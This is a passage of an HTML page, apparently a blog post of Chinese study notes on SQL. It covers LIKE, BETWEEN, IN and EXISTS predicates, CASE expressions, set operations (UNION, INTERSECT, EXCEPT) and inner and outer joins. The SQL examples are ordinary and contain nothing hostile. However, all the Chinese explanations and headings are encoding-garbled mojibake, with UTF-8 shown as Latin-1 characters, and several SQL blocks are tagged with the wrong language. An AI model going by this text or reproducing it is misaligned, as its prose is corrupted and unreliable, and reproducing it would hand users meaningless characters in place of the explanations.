id="å‰æ–¹ä¸€è‡´æŸ¥è¯¢"><a href="#å‰æ–¹ä¸€è‡´æŸ¥è¯¢" class="headerlink" title="å‰æ–¹ä¸€è‡´æŸ¥è¯¢"></a>å‰æ–¹ä¸€è‡´æŸ¥è¯¢</h4><p>ç”¨æ¥æŸ¥è¯¢çš„å­—ç¬¦ä¸²ï¼Œä¸æŸ¥è¯¢å¯¹è±¡çš„èµ·å§‹éƒ¨åˆ†ç›¸åŒã€‚</p><h4 id="ä¸­é—´ä¸€è‡´"><a href="#ä¸­é—´ä¸€è‡´" class="headerlink" title="ä¸­é—´ä¸€è‡´"></a>ä¸­é—´ä¸€è‡´</h4><p>ç”¨æ¥æŸ¥è¯¢çš„å­—ç¬¦ä¸²ï¼Œä¸æŸ¥è¯¢å¯¹è±¡çš„éƒ¨åˆ†ç›¸åŒã€‚</p><h4 id="åæ–¹ä¸€è‡´"><a href="#åæ–¹ä¸€è‡´" class="headerlink" title="åæ–¹ä¸€è‡´"></a>åæ–¹ä¸€è‡´</h4><p>ç”¨æ¥æŸ¥è¯¢çš„å­—ç¬¦ä¸²ï¼Œä¸æŸ¥è¯¢å¯¹è±¡çš„æœ«å°¾éƒ¨åˆ†ç›¸åŒã€‚</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <br>  <span class="hljs-keyword">from</span> SampleLike<br>  <span class="hljs-keyword">where</span> strcol <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;ddd%&#x27;</span><br></code></pre></td></tr></table></figure><p><code>%</code> ä»£è¡¨â€0å­—ç¬¦ä»¥ä¸Šçš„ä»»æ„å­—ç¬¦ä¸²â€.</p><p><code>_</code> ä»£è¡¨â€ä»»æ„ä¸€ä¸ªå­—ç¬¦â€.</p><h3 id="BETWEEN-è°“è¯-â€“-èŒƒå›´æŸ¥è¯¢"><a href="#BETWEEN-è°“è¯-â€“-èŒƒå›´æŸ¥è¯¢" class="headerlink" title="BETWEEN è°“è¯ â€“ èŒƒå›´æŸ¥è¯¢"></a>BETWEEN è°“è¯ â€“ èŒƒå›´æŸ¥è¯¢</h3><p>ä½¿ç”¨3ä¸ªå‚æ•°:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> product_name, sale_price<br>  <span class="hljs-keyword">from</span> Product<br> <span class="hljs-keyword">where</span> sale_price <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">100</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">1000</span>;<br></code></pre></td></tr></table></figure><h3 id="IS-NULLã€IS-NOT-NULL-â€“-åˆ¤æ–­æ˜¯å¦ä¸º-NULL"><a href="#IS-NULLã€IS-NOT-NULL-â€“-åˆ¤æ–­æ˜¯å¦ä¸º-NULL" class="headerlink" title="IS NULLã€IS NOT NULL â€“ åˆ¤æ–­æ˜¯å¦ä¸º NULL"></a>IS NULLã€IS NOT NULL â€“ åˆ¤æ–­æ˜¯å¦ä¸º NULL</h3><h3 id="IN-è°“è¯-â€“-OR-çš„ç®€ä¾¿ç”¨æ³•"><a href="#IN-è°“è¯-â€“-OR-çš„ç®€ä¾¿ç”¨æ³•" class="headerlink" title="IN è°“è¯ â€“ OR çš„ç®€ä¾¿ç”¨æ³•"></a>IN è°“è¯ â€“ OR çš„ç®€ä¾¿ç”¨æ³•</h3><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">select</span> product_name, purchase_price<br>  <span class="hljs-keyword">from</span> Product<br> <span class="hljs-keyword">where</span> purchase_price I<span class="hljs-meta">N</span>(320, 500, 5000)<br></code></pre></td></tr></table></figure><p>å…¶å¦å®šå½¢å¼ä¸º <code>NOT IN</code>.</p><p>IN å’Œ NOT IN æ— æ³•å–å‡º NULL æ•°æ®ã€‚</p><h3 id="ä½¿ç”¨å­æŸ¥è¯¢ä½œä¸º-IN-è°“è¯çš„å‚æ•°"><a href="#ä½¿ç”¨å­æŸ¥è¯¢ä½œä¸º-IN-è°“è¯çš„å‚æ•°" class="headerlink" title="ä½¿ç”¨å­æŸ¥è¯¢ä½œä¸º IN è°“è¯çš„å‚æ•°"></a>ä½¿ç”¨å­æŸ¥è¯¢ä½œä¸º IN è°“è¯çš„å‚æ•°</h3><h4 id="IN-å’Œå­æŸ¥è¯¢"><a href="#IN-å’Œå­æŸ¥è¯¢" class="headerlink" title="IN å’Œå­æŸ¥è¯¢"></a>IN å’Œå­æŸ¥è¯¢</h4><p>IN(NOT IN)è°“è¯ï¼Œå¯ä»¥ä½¿ç”¨å­æŸ¥è¯¢ä½œä¸ºå…¶å‚æ•°ã€‚</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> product_name, <span class="hljs-function">sale_price</span><br><span class="hljs-function">  <span class="hljs-keyword">from</span> Product</span><br><span class="hljs-function"> <span class="hljs-keyword">where</span> product_id <span class="hljs-title">IN</span> (<span class="hljs-params"><span class="hljs-keyword">select</span> product_id </span></span><br><span class="hljs-params"><span class="hljs-function">                        <span class="hljs-keyword">from</span> ShopProduct</span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-keyword">where</span> shop_id = <span class="hljs-string">&#x27;000C&#x27;</span></span>)</span>;<br></code></pre></td></tr></table></figure><h4 id="NOT-IN-å’Œå­æŸ¥è¯¢"><a href="#NOT-IN-å’Œå­æŸ¥è¯¢" class="headerlink" title="NOT IN å’Œå­æŸ¥è¯¢"></a>NOT IN å’Œå­æŸ¥è¯¢</h4><p>è¯­æ³•å’Œ IN ä¸€è‡´ã€‚</p><h3 id="EXIST-è°“è¯"><a href="#EXIST-è°“è¯" class="headerlink" title="EXIST è°“è¯"></a>EXIST è°“è¯</h3><h4 id="EXISTSè°“è¯çš„ä½¿ç”¨æ–¹æ³•"><a href="#EXISTSè°“è¯çš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="EXISTSè°“è¯çš„ä½¿ç”¨æ–¹æ³•"></a>EXISTSè°“è¯çš„ä½¿ç”¨æ–¹æ³•</h4><p>è°“è¯çš„ä½œç”¨å°±æ˜¯ â€œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ»¡è¶³æŸç§æ¡ä»¶çš„è®°å½•â€</p><h5 id="EXIST-çš„å‚æ•°"><a href="#EXIST-çš„å‚æ•°" class="headerlink" title="EXIST çš„å‚æ•°"></a>EXIST çš„å‚æ•°</h5><p>EXIST å·¦ä¾§å¹¶æ²¡æœ‰å‚æ•°.</p><p>EXIST æ˜¯åªæœ‰1ä¸ªå‚æ•°çš„è°“è¯ï¼Œå³ä¾§å‚æ•°é€šå¸¸ä¸ºä¸€ä¸ªå­æŸ¥è¯¢ã€‚</p><h5 id="å­æŸ¥è¯¢ä¸­çš„-select"><a href="#å­æŸ¥è¯¢ä¸­çš„-select" class="headerlink" title="å­æŸ¥è¯¢ä¸­çš„ select *"></a>å­æŸ¥è¯¢ä¸­çš„ select *</h5><p>EXIST åªå…³å¿ƒè®°å½•æ˜¯å¦å­˜åœ¨ã€‚</p><p>åœ¨ EXIST çš„å­æŸ¥è¯¢ä¸­ï¼Œå¸¸å¸¸ä¹¦å†™ <code>select *</code>.</p><h5 id="NOT-EXIST"><a href="#NOT-EXIST" class="headerlink" title="NOT EXIST"></a>NOT EXIST</h5><p>ä¸ EXIST ç›¸åï¼Œå½“â€ä¸å­˜åœ¨â€æ»¡è¶³å­æŸ¥è¯¢ä¸­æŒ‡å®šæ¡ä»¶çš„è®°å½•æ—¶è¿”å›çœŸã€‚</p><h2 id="6-3-CASE-è¡¨è¾¾å¼"><a href="#6-3-CASE-è¡¨è¾¾å¼" class="headerlink" title="6-3 CASE è¡¨è¾¾å¼"></a>6-3 CASE è¡¨è¾¾å¼</h2><h3 id="ä»€ä¹ˆæ˜¯-CASE-è¡¨è¾¾å¼"><a href="#ä»€ä¹ˆæ˜¯-CASE-è¡¨è¾¾å¼" class="headerlink" title="ä»€ä¹ˆæ˜¯ CASE è¡¨è¾¾å¼"></a>ä»€ä¹ˆæ˜¯ CASE è¡¨è¾¾å¼</h3><p>case ä½œä¸ºæ¡ä»¶åˆ†æ”¯ã€‚</p><h3 id="CASE-è¡¨è¾¾å¼çš„è¯­æ³•"><a href="#CASE-è¡¨è¾¾å¼çš„è¯­æ³•" class="headerlink" title="CASE è¡¨è¾¾å¼çš„è¯­æ³•"></a>CASE è¡¨è¾¾å¼çš„è¯­æ³•</h3><p>CASE è¡¨è¾¾å¼çš„è¯­æ³•åˆ†ä¸º:</p><ul><li>ç®€å• case è¡¨è¾¾å¼</li><li>æœç´¢ case è¡¨è¾¾å¼<br>æœç´¢è¡¨è¾¾å¼åŒ…å«äº†ç®€å• case è¡¨è¾¾å¼çš„å…¨éƒ¨åŠŸèƒ½ã€‚<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">case when <span class="hljs-tag">&lt;<span class="hljs-name">æ±‚å€¼è¡¨è¾¾å¼</span>&gt;</span> then <span class="hljs-tag">&lt;<span class="hljs-name">è¡¨è¾¾å¼</span>&gt;</span><br>     when <span class="hljs-tag">&lt;<span class="hljs-name">æ±‚å€¼è¡¨è¾¾å¼</span>&gt;</span> then <span class="hljs-tag">&lt;<span class="hljs-name">è¡¨è¾¾å¼</span>&gt;</span><br>     when <span class="hljs-tag">&lt;<span class="hljs-name">æ±‚å€¼è¡¨è¾¾å¼</span>&gt;</span> then <span class="hljs-tag">&lt;<span class="hljs-name">è¡¨è¾¾å¼</span>&gt;</span><br>                .<br>                . <br>                . <br>     else <span class="hljs-tag">&lt;<span class="hljs-name">è¡¨è¾¾å¼</span>&gt;</span><br>end<br></code></pre></td></tr></table></figure><code>when</code> å­å¥ä¸­çš„â€&lt;æ±‚å€¼è¡¨è¾¾å¼&gt;â€å°±æ˜¯ç±»ä¼¼â€åˆ— &#x3D; å€¼â€</li></ul><p>ç›´åˆ°è¿”å›ä¸ºçœŸä¸ºæ­¢.</p><h3 id="CASE-è¡¨è¾¾å¼çš„ä½¿ç”¨æ–¹æ³•"><a href="#CASE-è¡¨è¾¾å¼çš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="CASE è¡¨è¾¾å¼çš„ä½¿ç”¨æ–¹æ³•"></a>CASE è¡¨è¾¾å¼çš„ä½¿ç”¨æ–¹æ³•</h3><p><code>else</code>å­å¥çœç•¥ä¸å†™æ—¶ä¼šé»˜è®¤ä¸º<code>else null</code>.</p><h4 id="CASE-è¡¨è¾¾å¼çš„ä¹¦å†™ä½ç½®"><a href="#CASE-è¡¨è¾¾å¼çš„ä¹¦å†™ä½ç½®" class="headerlink" title="CASE è¡¨è¾¾å¼çš„ä¹¦å†™ä½ç½®"></a>CASE è¡¨è¾¾å¼çš„ä¹¦å†™ä½ç½®</h4><p><code>CASE</code> æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå¯ä»¥å†™åœ¨ä»»æ„ä½ç½®ã€‚</p><h3 id="ç®€å•-CASE-è¡¨è¾¾å¼"><a href="#ç®€å•-CASE-è¡¨è¾¾å¼" class="headerlink" title="ç®€å• CASE è¡¨è¾¾å¼"></a>ç®€å• CASE è¡¨è¾¾å¼</h3><p>ä¼šå—æ¡ä»¶çš„çº¦æŸ.</p><p>è¯­æ³•:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml">case <span class="hljs-tag">&lt;<span class="hljs-name">è¡¨è¾¾å¼</span>&gt;</span><br>     when <span class="hljs-tag">&lt;<span class="hljs-name">è¡¨è¾¾å¼</span>&gt;</span> then <span class="hljs-tag">&lt;<span class="hljs-name">è¡¨è¾¾å¼</span>&gt;</span><br>     when <span class="hljs-tag">&lt;<span class="hljs-name">è¡¨è¾¾å¼</span>&gt;</span> then <span class="hljs-tag">&lt;<span class="hljs-name">è¡¨è¾¾å¼</span>&gt;</span><br>     when <span class="hljs-tag">&lt;<span class="hljs-name">è¡¨è¾¾å¼</span>&gt;</span> then <span class="hljs-tag">&lt;<span class="hljs-name">è¡¨è¾¾å¼</span>&gt;</span><br>                .<br>                . <br>                . <br>     else <span class="hljs-tag">&lt;<span class="hljs-name">è¡¨è¾¾å¼</span>&gt;</span><br>end<br></code></pre></td></tr></table></figure><p>å’Œæœç´¢ case è¡¨è¾¾å¼çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œæ±‚å€¼è¡¨è¾¾å¼å˜æˆäº† case åçš„è¡¨è¾¾å¼å’Œ when åé¢çš„è¡¨è¾¾å¼.</p><h3 id="ç‰¹å®šçš„-case-è¡¨è¾¾å¼"><a href="#ç‰¹å®šçš„-case-è¡¨è¾¾å¼" class="headerlink" title="ç‰¹å®šçš„ case è¡¨è¾¾å¼"></a>ç‰¹å®šçš„ case è¡¨è¾¾å¼</h3><h1 id="ç¬¬7ç« -é›†åˆè¿ç®—"><a href="#ç¬¬7ç« -é›†åˆè¿ç®—" class="headerlink" title="ç¬¬7ç«  é›†åˆè¿ç®—"></a>ç¬¬7ç«  é›†åˆè¿ç®—</h1><h2 id="7-1-è¡¨çš„åŠ å‡æ³•"><a href="#7-1-è¡¨çš„åŠ å‡æ³•" class="headerlink" title="7-1 è¡¨çš„åŠ å‡æ³•"></a>7-1 è¡¨çš„åŠ å‡æ³•</h2><h3 id="ä»€ä¹ˆæ˜¯é›†åˆè¿ç®—"><a href="#ä»€ä¹ˆæ˜¯é›†åˆè¿ç®—" class="headerlink" title="ä»€ä¹ˆæ˜¯é›†åˆè¿ç®—"></a>ä»€ä¹ˆæ˜¯é›†åˆè¿ç®—</h3><p>é›†åˆåœ¨æ•°æ®åº“ä¸­è¡¨ç¤º <mark>è®°å½•çš„é›†åˆ</mark>.</p><p>é›†åˆè¿ç®—å°±æ˜¯å¯¹æ»¡è¶³åŒä¸€è§„åˆ™çš„è®°å½•è¿›è¡Œçš„åŠ å‡ç­‰å››åˆ™è¿ç®—ã€‚</p><p>é€šè¿‡é›†åˆè¿ç®—ï¼Œå¯ä»¥å¾—åˆ°ä¸¤å¼ è¡¨ä¸­è®°å½•çš„é›†åˆæˆ–è€…å…¬å…±è®°å½•çš„é›†åˆã€‚</p><p>ç”¨äºé›†åˆè¿ç®—çš„è¿ç®—ç¬¦ç§°ä¸º <mark>é›†åˆè¿ç®—ç¬¦</mark>.</p><h3 id="è¡¨çš„åŠ æ³•-â€“-UNION"><a href="#è¡¨çš„åŠ æ³•-â€“-UNION" class="headerlink" title="è¡¨çš„åŠ æ³• â€“ UNION"></a>è¡¨çš„åŠ æ³• â€“ UNION</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product<br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product2<br></code></pre></td></tr></table></figure><p>ç»“æœä¼šåŒ…å«ä¸¤å¼ è¡¨çš„å…¨éƒ¨å†…å®¹ã€‚ä¹Ÿå°±æ˜¯å¹¶é›†.</p><p>é›†åˆè¿ç®—ç¬¦ä¹Ÿä¼šé™¤å»é‡å¤çš„è®°å½•ã€‚</p><h3 id="é›†åˆè¿ç®—çš„æ³¨æ„äº‹é¡¹"><a href="#é›†åˆè¿ç®—çš„æ³¨æ„äº‹é¡¹" class="headerlink" title="é›†åˆè¿ç®—çš„æ³¨æ„äº‹é¡¹"></a>é›†åˆè¿ç®—çš„æ³¨æ„äº‹é¡¹</h3><h4 id="1-ä½œä¸ºè¿ç®—å¯¹è±¡çš„è®°å½•çš„åˆ—æ•°å¿…é¡»ç›¸åŒ"><a href="#1-ä½œä¸ºè¿ç®—å¯¹è±¡çš„è®°å½•çš„åˆ—æ•°å¿…é¡»ç›¸åŒ" class="headerlink" title="1 ä½œä¸ºè¿ç®—å¯¹è±¡çš„è®°å½•çš„åˆ—æ•°å¿…é¡»ç›¸åŒ"></a>1 ä½œä¸ºè¿ç®—å¯¹è±¡çš„è®°å½•çš„åˆ—æ•°å¿…é¡»ç›¸åŒ</h4><p>ä¹Ÿå°±æ˜¯ select åçš„åˆ—æ•°ã€‚</p><h4 id="2-ä½œä¸ºè¿ç®—å¯¹è±¡çš„è®°å½•ä¸­åˆ—çš„ç±»å‹å¿…é¡»ä¸€è‡´"><a href="#2-ä½œä¸ºè¿ç®—å¯¹è±¡çš„è®°å½•ä¸­åˆ—çš„ç±»å‹å¿…é¡»ä¸€è‡´" class="headerlink" title="2 ä½œä¸ºè¿ç®—å¯¹è±¡çš„è®°å½•ä¸­åˆ—çš„ç±»å‹å¿…é¡»ä¸€è‡´"></a>2 ä½œä¸ºè¿ç®—å¯¹è±¡çš„è®°å½•ä¸­åˆ—çš„ç±»å‹å¿…é¡»ä¸€è‡´</h4><p>ç›¸åŒä½ç½®ä¸Šçš„åˆ—å¿…é¡»æ˜¯åŒä¸€æ•°æ®ç±»å‹ã€‚</p><h4 id="3-å¯ä»¥ä½¿ç”¨ä»»ä½•-select-è¯­å¥ï¼Œä½†-order-by-å­å¥åªèƒ½åœ¨æœ€åä½¿ç”¨ä¸€æ¬¡ã€‚"><a href="#3-å¯ä»¥ä½¿ç”¨ä»»ä½•-select-è¯­å¥ï¼Œä½†-order-by-å­å¥åªèƒ½åœ¨æœ€åä½¿ç”¨ä¸€æ¬¡ã€‚" class="headerlink" title="3 å¯ä»¥ä½¿ç”¨ä»»ä½• select è¯­å¥ï¼Œä½† order by å­å¥åªèƒ½åœ¨æœ€åä½¿ç”¨ä¸€æ¬¡ã€‚"></a>3 å¯ä»¥ä½¿ç”¨ä»»ä½• select è¯­å¥ï¼Œä½† order by å­å¥åªèƒ½åœ¨æœ€åä½¿ç”¨ä¸€æ¬¡ã€‚</h4><h3 id="åŒ…å«é‡å¤è¡Œçš„é›†åˆè¿ç®—-â€“-ALL-é€‰é¡¹"><a href="#åŒ…å«é‡å¤è¡Œçš„é›†åˆè¿ç®—-â€“-ALL-é€‰é¡¹" class="headerlink" title="åŒ…å«é‡å¤è¡Œçš„é›†åˆè¿ç®— â€“ ALL é€‰é¡¹"></a>åŒ…å«é‡å¤è¡Œçš„é›†åˆè¿ç®— â€“ ALL é€‰é¡¹</h3><p>åœ¨ UNION å åŠ  ALL å°±ä¼šä¿ç•™é‡å¤è¡Œ.</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product<br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span><br><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product2;<br></code></pre></td></tr></table></figure><h3 id="é€‰å–è¡¨ä¸­å…¬å…±éƒ¨åˆ†-â€“-INTERSECT"><a href="#é€‰å–è¡¨ä¸­å…¬å…±éƒ¨åˆ†-â€“-INTERSECT" class="headerlink" title="é€‰å–è¡¨ä¸­å…¬å…±éƒ¨åˆ† â€“ INTERSECT"></a>é€‰å–è¡¨ä¸­å…¬å…±éƒ¨åˆ† â€“ INTERSECT</h3><p>é€‰å–ä¸¤ä¸ªè®°å½•é›†åˆä¸­å…¬å…±éƒ¨åˆ†çš„äº¤é›†(INTERSECT).</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product<br><span class="hljs-keyword">INTERSECT</span><br><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product2<br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> product_id;<br></code></pre></td></tr></table></figure><p>ä¿ç•™é‡å¤é¡¹åŒæ ·å¯ä»¥ä½¿ç”¨ <code>INTERSECT ALL</code>.</p><h3 id="è®°å½•çš„å‡æ³•-â€“-EXCEPT"><a href="#è®°å½•çš„å‡æ³•-â€“-EXCEPT" class="headerlink" title="è®°å½•çš„å‡æ³• â€“ EXCEPT"></a>è®°å½•çš„å‡æ³• â€“ EXCEPT</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product<br><span class="hljs-keyword">EXCEPT</span><br><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product2<br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> product_id;<br></code></pre></td></tr></table></figure><p>ç»“æœåªåŒ…å«Productè¡¨ä¸­è®°å½•é™¤å»Product2è¡¨ä¸­è®°å½•ä¹‹åçš„å‰©ä½™éƒ¨åˆ†ã€‚</p><h2 id="7-2-è”ç»“-ä»¥åˆ—ä¸ºå•ä½å¯¹è¡¨è¿›è¡Œè”ç»“"><a href="#7-2-è”ç»“-ä»¥åˆ—ä¸ºå•ä½å¯¹è¡¨è¿›è¡Œè”ç»“" class="headerlink" title="7-2 è”ç»“(ä»¥åˆ—ä¸ºå•ä½å¯¹è¡¨è¿›è¡Œè”ç»“)"></a>7-2 è”ç»“(ä»¥åˆ—ä¸ºå•ä½å¯¹è¡¨è¿›è¡Œè”ç»“)</h2><h3 id="ä»€ä¹ˆæ˜¯è”ç»“"><a href="#ä»€ä¹ˆæ˜¯è”ç»“" class="headerlink" title="ä»€ä¹ˆæ˜¯è”ç»“"></a>ä»€ä¹ˆæ˜¯è”ç»“</h3><p>UNION å’Œ INTERSECT ç­‰ä¼šå¯¼è‡´è®°å½•è¡Œæ•°çš„å¢å‡ã€‚</p><p>è”ç»“(join)è¿ç®—å°±æ˜¯å°†å…¶ä»–è¡¨ä¸­çš„åˆ—æ·»åŠ è¿‡æ¥ã€‚</p><h3 id="å†…è”ç»“-â€“-INNER-JOIN"><a href="#å†…è”ç»“-â€“-INNER-JOIN" class="headerlink" title="å†…è”ç»“ â€“ INNER JOIN"></a>å†…è”ç»“ â€“ INNER JOIN</h3><h4 id="å†…è”ç»“è¦ç‚¹1-â€“-from-å­å¥"><a href="#å†…è”ç»“è¦ç‚¹1-â€“-from-å­å¥" class="headerlink" title="å†…è”ç»“è¦ç‚¹1 â€“ from å­å¥"></a>å†…è”ç»“è¦ç‚¹1 â€“ from å­å¥</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> ShopProduct <span class="hljs-keyword">AS</span> SP <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> Product <span class="hljs-keyword">AS</span> P<br></code></pre></td></tr></table></figure><h4 id="å†…è”ç»“è¦ç‚¹2-â€“-on-å­å¥"><a href="#å†…è”ç»“è¦ç‚¹2-â€“-on-å­å¥" class="headerlink" title="å†…è”ç»“è¦ç‚¹2 â€“ on å­å¥"></a>å†…è”ç»“è¦ç‚¹2 â€“ on å­å¥</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ON <span class="hljs-keyword">SP</span>.product_id <span class="hljs-operator">=</span> P.product_id<br></code></pre></td></tr></table></figure><p>èµ·åˆ° where çš„ä½œç”¨.</p><p>ON å­å¥éœ€ä¹¦å†™åˆ° from å’Œ where ä¹‹é—´ã€‚</p><h4 id="å†…è”ç»“è¦ç‚¹3-â€“-select-å­å¥"><a href="#å†…è”ç»“è¦ç‚¹3-â€“-select-å­å¥" class="headerlink" title="å†…è”ç»“è¦ç‚¹3 â€“ select å­å¥"></a>å†…è”ç»“è¦ç‚¹3 â€“ select å­å¥</h4><p>ç”±äºå¤šè¡¨è”ç»“æ—¶å®¹æ˜“å‘ç”Ÿæ··ä¹±, å› æ­¤é‡‡ç”¨ â€œ&lt;è¡¨çš„åˆ«å&gt;.&lt;åˆ—å&gt;â€ çš„å½¢å¼æ¥æŒ‡å®šåˆ—ã€‚</p><p>å…¶å®åªæœ‰åŒæ—¶å­˜åœ¨äºä¸¤å¼ è¡¨ä¸­çš„åˆ—å¿…é¡»ä½¿ç”¨è¿™ç§å½¢å¼ã€‚</p><h4 id="å†…è”ç»“å’Œ-where-å­å¥ç»“åˆä½¿ç”¨"><a href="#å†…è”ç»“å’Œ-where-å­å¥ç»“åˆä½¿ç”¨" class="headerlink" title="å†…è”ç»“å’Œ where å­å¥ç»“åˆä½¿ç”¨"></a>å†…è”ç»“å’Œ where å­å¥ç»“åˆä½¿ç”¨</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">select <span class="hljs-built_in">SP</span>.<span class="hljs-keyword">shop_id, </span><span class="hljs-built_in">SP</span>.<span class="hljs-keyword">shop_name, </span><span class="hljs-built_in">SP</span>.product_id, P.product_name, P.sale_price<br>  from <span class="hljs-keyword">ShopProduct </span>AS <span class="hljs-built_in">SP</span> INNER <span class="hljs-keyword">JOIN </span>Product AS P<br>    ON <span class="hljs-built_in">SP</span>.product_id = P.product_id<br>  where <span class="hljs-built_in">SP</span>.<span class="hljs-keyword">shop_id </span>= <span class="hljs-string">&#x27;000A&#x27;</span>;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨è”ç»“è¿ç®—å°†æ»¡è¶³ç›¸åŒè§„åˆ™çš„è¡¨è”ç»“èµ·æ¥ï¼ŒWHEREã€GROUP BYã€HAVINGã€ORDER BYç­‰å·¥å…·éƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚</p><p>è¿™å¼ è¡¨åªåœ¨ select è¯­å¥æ‰§è¡ŒæœŸé—´å­˜åœ¨ï¼Œselect è¯­å¥æ‰§è¡Œä¹‹åå°±ä¼šæ¶ˆå¤±ã€‚å¦‚æœå¸Œæœ›ç»§ç»­ä½¿ç”¨è¿™å¼ è¡¨ï¼Œéœ€å°†å…¶åˆ›å»ºä¸ºè§†å›¾.</p><h3 id="å¤–è”ç»“-â€“-OUTER-JOIN"><a href="#å¤–è”ç»“-â€“-OUTER-JOIN" class="headerlink" title="å¤–è”ç»“ â€“ OUTER JOIN"></a>å¤–è”ç»“ â€“ OUTER JOIN</h3><p>å®ç°â€ä»ä¸¤å¼ è¡¨ä¸­å–å‡ºâ€çš„å°±æ˜¯è”ç»“åŠŸèƒ½ã€‚</p><p>å¤–è”ç»“ä¹Ÿæ˜¯é€šè¿‡ ON å­å¥çš„è”ç»“é”®å°†ä¸¤å¼ è¡¨è¿›è¡Œè”ç»“ï¼Œå¹¶ä»ä¸¤å¼ è¡¨ä¸­åŒæ—¶é€‰å–ç›¸åº”çš„åˆ—ã€‚</p><h4 id="å¤–è”ç»“è¦ç‚¹1-â€“-é€‰å–å‡ºå•å¼ è¡¨ä¸­å…¨éƒ¨çš„ä¿¡æ¯"><a href="#å¤–è”ç»“è¦ç‚¹1-â€“-é€‰å–å‡ºå•å¼ è¡¨ä¸­å…¨éƒ¨çš„ä¿¡æ¯" class="headerlink" title="å¤–è”ç»“è¦ç‚¹1 â€“ é€‰å–å‡ºå•å¼ è¡¨ä¸­å…¨éƒ¨çš„ä¿¡æ¯"></a>å¤–è”ç»“è¦ç‚¹1 â€“ é€‰å–å‡ºå•å¼ è¡¨ä¸­å…¨éƒ¨çš„ä¿¡æ¯</h4><p>å†…è”ç»“åªèƒ½é€‰å–åŒæ—¶å­˜åœ¨äºä¸¤å¼ è¡¨ä¸­çš„æ•°æ®ã€‚</p><p>å¯¹äºå¤–è”ç»“ï¼Œåªè¦æ•°æ®å­˜åœ¨äºæŸä¸€å¼ è¡¨ä¸­ï¼Œå°±èƒ½å¤Ÿè¯»å–å‡ºæ¥ã€‚</p><p>å¤–è”ç»“åç§°çš„åˆæ¥ä¹Ÿè·Ÿ null æœ‰å…³ï¼Œå³â€ç»“æœä¸­åŒ…å«åŸè¡¨ä¸­ä¸å­˜åœ¨çš„ä¿¡æ¯â€.</p><h4 id="å¤–è”ç»“è¦ç‚¹2-â€“-æ¯å¼ è¡¨éƒ½æ˜¯ä¸»è¡¨å—"><a href="#å¤–è”ç»“è¦ç‚¹2-â€“-æ¯å¼ 